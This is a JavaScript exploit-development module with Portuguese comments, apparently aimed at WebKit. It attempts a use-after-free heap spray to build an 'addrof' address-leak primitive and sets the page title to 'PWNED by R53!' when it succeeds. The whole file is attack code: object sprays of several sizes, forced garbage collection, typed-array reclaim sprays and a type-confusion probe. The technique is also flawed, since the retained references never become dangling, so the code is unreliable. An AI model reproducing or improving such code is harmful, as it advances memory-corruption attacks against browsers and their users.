// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R53 - A Ofensiva Total)
// =======================================================================================
// O CAPÍTULO FINAL.
// Esta é a tentativa mais agressiva e caótica. O objetivo é criar o máximo de
// pressão e fragmentação no alocador de memória, usando sprays de múltiplos
// tamanhos e intercalando alocações/liberações para forçar um erro de alocação
// que possamos explorar com o UAF. Esta é a nossa última e melhor chance.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R53_TotalOffensive";

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R53)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: A Ofensiva Total (R53) ---`, "test");

    let final_result = { success: false, message: "A Ofensiva Total falhou em romper as defesas." };

    try {
        // Envolvemos a tentativa mais agressiva em um laço de última chance.
        const MAX_ATTEMPTS = 5;
        for (let i = 1; i <= MAX_ATTEMPTS; i++) {
            logS3(`----------------- Iniciando Ofensiva ${i}/${MAX_ATTEMPTS} -----------------`, "subtest");
            const addrof = createUltimateAddrofPrimitive();
            if (addrof) {
                logS3(`++++++++++++ SUCESSO NA OFENSIVA ${i}! As defesas cederam! ++++++++++++`, "vuln");
                logS3("Primitiva `addrof` ESTÁVEL construída com sucesso!", "good");

                const some_object = { a: 1, b: 2 };
                const some_addr = addrof(some_object);
                logS3(`    Prova de Vida: addrof({a:1,b:2}) -> ${some_addr.toString(true)}`, "leak");
                
                final_result = { success: true, message: "Comprometimento total alcançado via `addrof` estável!" };
                break; // SUCESSO!
            }
            logS3(`Ofensiva ${i} repelida. As defesas do alocador se mantiveram.`, "warn");
            await PAUSE_S3(500);
        }

    } catch (e) {
        final_result.message = `Exceção catastrófica: ${e.message}`;
        logS3(final_result.message, "critical");
    }
    
    document.title = final_result.success ? "PWNED by R53!" : "Defenses Held";
    return final_result;
}


// --- A função de primitiva UAF mais agressiva possível ---
function createUltimateAddrofPrimitive() {
    logS3("    FASE 1: Criando Caos no Heap com Alocações Multi-Tamanho...", "info");
    let initial_spray = [];
    const SIZES = [128, 256, 512, 1024]; // Diferentes tamanhos de objeto
    for (let i = 0; i < 4096; i++) {
        const size = SIZES[i % SIZES.length];
        const properties = {};
        for(let j=0; j < size / 8; j++) properties[`p${j}`] = i;
        initial_spray.push(properties);
    }
    logS3(`    ${initial_spray.length} objetos de tamanhos variados pulverizados.`, "info");
    
    // Força a coleta de lixo e cria ponteiros pendurados
    let dangling_refs = initial_spray;
    initial_spray = null;
    triggerGC(); 

    logS3("    FASE 2: Spray de Reclamação Multi-Tipo para preencher os buracos...", "info");
    let reclaimers = [];
    for (let i = 0; i < 8192; i++) {
        if (i % 2 === 0) {
            reclaimers.push(new Float64Array(8));
        } else {
            reclaimers.push(new Uint32Array(16));
        }
    }
    logS3(`    ${reclaimers.length} arrays de tipos variados pulverizados.`, "info");

    logS3("    FASE 3: Buscando por uma única brecha nas defesas...", "info");
    let corrupted_cage = null;
    let reclaimer_array = null;
    
    for (let i = 0; i < dangling_refs.length; i++) {
        try {
            // Se a propriedade p0 não for mais um número, a confusão de tipos ocorreu.
            if (typeof dangling_refs[i].p0 !== 'number') {
                corrupted_cage = dangling_refs[i];
                // Esta é uma suposição, mas a melhor que temos sem um debugger
                reclaimer_array = reclaimers[i] || reclaimers[i-1] || reclaimers[i+1];
                if(reclaimer_array) {
                    logS3(`    BRECHA ENCONTRADA! Objeto ${i} foi corrompido!`, "good");
                    break;
                }
            }
        } catch(e) { /* Esperado que falhe para a maioria das referências */ }
    }

    if (!corrupted_cage) {
        return null;
    }

    // Se encontramos uma brecha, construímos a primitiva addrof a partir dela
    return function addrof(obj_to_leak) {
        // Usamos a gaiola corrompida, que agora é na verdade um TypedArray
        const cage_as_array = corrupted_cage;
        
        // Escrevemos nosso objeto alvo no que o motor ainda pensa ser uma propriedade
        cage_as_array.p1 = obj_to_leak; // p1 para evitar sobrescrever o cabeçalho em p0
        
        // Lemos de volta através do array de reclamação para obter o ponteiro como um double
        const buffer = new ArrayBuffer(8);
        const float_view = new Float64Array(buffer);
        const int_view = new Uint32Array(buffer);
        
        // Acessamos o índice correspondente à propriedade p1
        // (Este é um cálculo aproximado)
        float_view[0] = reclaimer_array[1]; 
        return new AdvancedInt64(int_view[0], int_view[1]);
    }
}

function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 1000; i++) {
            arr.push(new ArrayBuffer(1024 * 64)); // Aloca 64MB no total
        }
    } catch(e) {}
    for (let i = 0; i < 1000; i++) {
        // Tenta causar mais pressão no GC
        new String(i);
    }
}
